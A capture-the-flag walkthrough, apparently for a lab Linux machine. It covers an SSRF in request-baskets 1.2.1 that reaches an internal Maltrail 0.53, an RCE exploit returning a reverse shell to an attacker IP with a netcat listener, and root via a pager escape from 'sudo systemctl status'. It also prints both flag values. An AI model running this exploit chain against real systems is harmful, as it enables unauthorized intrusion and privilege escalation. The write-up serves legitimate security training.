System: Linux
Difficulty: Easy

IP Address: 10.129.229.26

# User Flag

NMAP Ports are enumerated.
```
sudo nmap 10.129.229.26 -sC -sV
```

Here are the results.
```
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)
|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)
|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)
80/tcp    filtered http
55555/tcp open     http    Golang net/http server
<SNIP>
```

Port  80 is filtered, so port 55555 can be accessed from the web server.


![[sau_1.png]]

The web application version is `request-baskets 1.2.1`.
There is an available SSRF exploit on GitHub.
```
git clone https://github.com/entr0pie/CVE-2023-27163.git
```

This forward URL parameter is what makes the application vulnerable to SSRF Attacks.
![[sau_2.png]]



After executing this command, it is possible to redirect the non-accessible webpage through this link.
```
bash CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:80
```

A web link has been generated.
```
<SNIP>
> Accessing http://10.129.229.26:55555/pybehb now makes the server request to http://127.0.0.1:80.
> Authorization: a9xV4sqae_99yEuBLyMzbh6UNbjJf25hAN6G_P2uKVWI
```

After exploring `http://10.129.229.26:55555/pybehb`, a webpage is returned successfully.
![[sau_3.png]]

`Maltrail v0.53` is vulnerable to a RCE exploit that can return a shell to the user.

Now another exploit is downloaded on the attacker machine.
```
git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git
```

The exploit is chained through the exploited link.
```
python exploit.py 10.10.14.238 4444 http://10.129.229.26:55555/pybehb
```

After listening, a connection has been returned.
```
kali@kali:~$ sudo nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.229.26 60652
```

User Flag contents in below.
```
58d63b1fb9780f47713162f03e946732
```

# Root Flag

Make sure to upgrade the TTY Session.
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c /bin/bash
```

Check the privileges of the current user.
```
puma@sau:/opt/maltrail$ sudo -l
```

It is possible to see a command allowed to run as root.
Since this command will open to a reader such as `less`, an exploit to break out with a shell might be possible.
```
Matching Defaults entries for puma on sau:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User puma may run the following commands on sau:
    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
```

Execute the command.
```
sudo /usr/bin/systemctl status trail.service
```

Break out of the shell.
```
!/bin/bash
```

The exploit was successful and a root shell is gained.

Root flag contents is in below.
```
0a4763be112e5bbdff246ef2b6ddda80
```